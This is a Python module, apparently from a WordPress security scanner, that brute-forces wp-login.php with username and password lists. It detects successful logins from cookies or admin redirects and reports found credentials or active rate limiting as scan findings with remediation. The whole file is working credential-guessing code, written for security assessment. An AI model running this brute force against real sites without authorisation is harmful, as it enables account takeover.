"""
WP-Login attacker — POST to wp-login.php.

Success detection:
  - Primary: "wordpress_logged_in_" in Set-Cookie header
  - Fallback: redirect to /wp-admin/ (301/302 + Location header)

Rate limiting: 3 consecutive 429/403 responses → detected.
"""
from __future__ import annotations

from plecost.engine.context import ScanContext
from plecost.engine.http_client import PlecostHTTPClient
from plecost.models import Finding, Severity
from plecost.modules.brute.base import BaseAttacker

_RATE_LIMIT_THRESHOLD = 3


class WPLoginAttacker(BaseAttacker):
    """Brute-force via wp-login.php POST."""

    async def attack(
        self,
        ctx: ScanContext,
        http: PlecostHTTPClient,
        usernames: list[str],
        passwords: list[str],
    ) -> list[Finding]:
        login_url = f"{ctx.url}/wp-login.php"
        found: list[tuple[str, str]] = []
        rate_limit_hits = 0
        rate_limited = False

        for username in usernames:
            if rate_limited:
                break
            for password in passwords:
                if rate_limited:
                    break
                try:
                    data = {
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/",
                        "testcookie": "1",
                    }
                    r = await http.post(login_url, data=data, follow_redirects=False)

                    if r.status_code in (429, 403):
                        rate_limit_hits += 1
                        if rate_limit_hits >= _RATE_LIMIT_THRESHOLD:
                            rate_limited = True
                            break
                        continue
                    rate_limit_hits = 0

                    # Primary: wordpress_logged_in_ cookie
                    set_cookie = r.headers.get("set-cookie", "")
                    if "wordpress_logged_in_" in set_cookie:
                        found.append((username, password))
                        continue

                    # Fallback: redirect to /wp-admin/
                    if r.status_code in (301, 302):
                        location = r.headers.get("location", "")
                        if "/wp-admin/" in location:
                            found.append((username, password))

                except Exception:
                    rate_limit_hits += 1
                    if rate_limit_hits >= _RATE_LIMIT_THRESHOLD:
                        rate_limited = True
                        break

        findings: list[Finding] = []

        if found:
            cred_list = "\n".join(f"  • {u} / {p}" for u, p in found)
            findings.append(Finding(
                id="PC-BRUTE-002", remediation_id="REM-BRUTE-002",
                title="Valid credentials found via wp-login.php brute force",
                severity=Severity.CRITICAL,
                description=(
                    f"Brute force via wp-login.php found {len(found)} valid credential pair(s)."
                ),
                evidence={"url": login_url, "credentials": cred_list},
                remediation=(
                    "Change found passwords immediately. Enable 2FA. "
                    "Implement account lockout and IP-based rate limiting."
                ),
                references=["https://wordpress.org/support/article/brute-force-attacks/"],
                cvss_score=9.8, module="brute"
            ))

        if rate_limited and not found:
            findings.append(Finding(
                id="PC-BRUTE-004", remediation_id="REM-BRUTE-004",
                title="wp-login.php brute force protection confirmed",
                severity=Severity.INFO,
                description=(
                    "Rate limiting or blocking was detected on wp-login.php "
                    "after repeated authentication attempts. Protection is active."
                ),
                evidence={"url": login_url, "consecutive_blocks": rate_limit_hits},
                remediation="No action required. Rate limiting is a positive security control.",
                references=[],
                cvss_score=0.0, module="brute"
            ))

        return findings
